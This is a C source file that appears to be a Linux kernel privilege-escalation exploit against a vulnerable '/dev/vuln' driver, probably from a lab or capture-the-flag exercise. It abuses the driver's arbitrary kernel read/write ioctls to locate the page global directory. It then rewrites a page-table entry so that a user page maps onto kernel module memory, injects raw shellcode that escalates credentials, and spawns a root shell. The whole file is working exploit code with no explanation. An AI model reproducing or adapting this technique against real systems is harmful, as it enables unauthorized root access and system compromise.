#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <string.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

unsigned long pageOffsetBase = 0xffff888000000000;

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
}

unsigned long read64(unsigned long kaddr) {

	struct rwRequest req;
	unsigned long value;;

	req.uaddr = &value;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_READ, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}

	close(fd);

	return value;
}

unsigned long getPFN(unsigned long pgdir, unsigned long vaddr) {

	unsigned long index1 = (vaddr >> 39) & 0x1ff;
	unsigned long index2 = (vaddr >> 30) & 0x1ff;
	unsigned long index3 = (vaddr >> 21) & 0x1ff;
	unsigned long index4 = (vaddr >> 12) & 0x1ff;
	
	unsigned long lv1 = read64(pgdir + index1 * 8);
	if (!lv1) {
		exit(-1);
	}
	unsigned long lv2 = read64((((lv1 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index2 * 8);
	if (!lv2) {
		exit(-1);
	}

	unsigned long lv3 = read64((((lv2 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index3 * 8);
	if (!lv3) {
		exit(-1);
	}

	unsigned long lv4 = read64((((lv3 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index4 * 8);
	if (!lv4) {
		exit(-1);
	}
	
	return ((lv4 >> 12) & 0x3fffffff);
}

unsigned long getPTE(unsigned long pgdir, unsigned long vaddr) {

	unsigned long index1 = (vaddr >> 39) & 0x1ff;
	unsigned long index2 = (vaddr >> 30) & 0x1ff;
	unsigned long index3 = (vaddr >> 21) & 0x1ff;
	unsigned long index4 = (vaddr >> 12) & 0x1ff;
	
	unsigned long lv1 = read64(pgdir + index1 * 8);
	if (!lv1) {
		exit(-1);
	}
	unsigned long lv2 = read64((((lv1 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index2 * 8);
	if (!lv2) {
		exit(-1);
	}

	unsigned long lv3 = read64((((lv2 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index3 * 8);
	if (!lv3) {
		exit(-1);
	}

	return (((lv3 >> 12) & 0x3fffffff) << 12) + pageOffsetBase + index4 * 8;
}

int check_page(unsigned long addr) {

	unsigned long page[0x101];

	for (int i = 0; i < 0x101; i++) {
		page[i] = read64(addr + i*8);
	}
	for (int i = 0; i < 0x100; i++) {
		if (((page[i] & 0xff) != 0x67) || (!(page[i] >> 63))) {
			return 0;
		}
	}

	return page[0x100] == 0;
}

int main (int argc, char **argv){

	char sc[] = "\x48\x31\xFF\x48\xC7\xC1\xA0\xC0\x07\x81\xFF\xD1\x48\x89\xC7\x48\xC7\xC1\x20\xBD\x07\x81\xFF\xD1\xC3";
	void *pg;
	unsigned long search_addr;
	
	search_addr = pageOffsetBase + (0x7c000 << 12);
	
	for (unsigned long i = 1; i < 0x100; i++) {
		pg = mmap((void *)(i << 39), 0x1000, PROT_READ|PROT_WRITE, MAP_POPULATE|MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
		if (pg == MAP_FAILED) {
			perror("mmap");
			exit(-1);
		}
	}

	pg = mmap((void *)0xdead000, 0x1000, PROT_READ|PROT_WRITE, MAP_POPULATE|MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	if (pg == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	printf("[*] starting search from addr %p\n", (void *)search_addr);
	
	while(1) {
		if (check_page(search_addr)) {
			printf("[+] located the PGD: %p\n", (void *)search_addr);
			break;
		}
		search_addr += 0x1000;
	}

	unsigned long module_base = 0xffffffffc0000000;
	unsigned long kpgd = search_addr;
	unsigned long upgd = search_addr | 0x1000;

	/* find the physical frame of module base */
	unsigned long pfn = getPFN(kpgd, module_base);
	unsigned long pte_addr = getPTE(upgd, 0xdead000);
	unsigned long original = read64(pte_addr);

	write64(pte_addr ,(pfn << 12 | 0x67));
	memcpy((void *)0xdead000, sc, sizeof(sc));

	// trigger int3
	open("/dev/vuln", O_RDONLY);
	system("/bin/sh");
	
	return 0;
}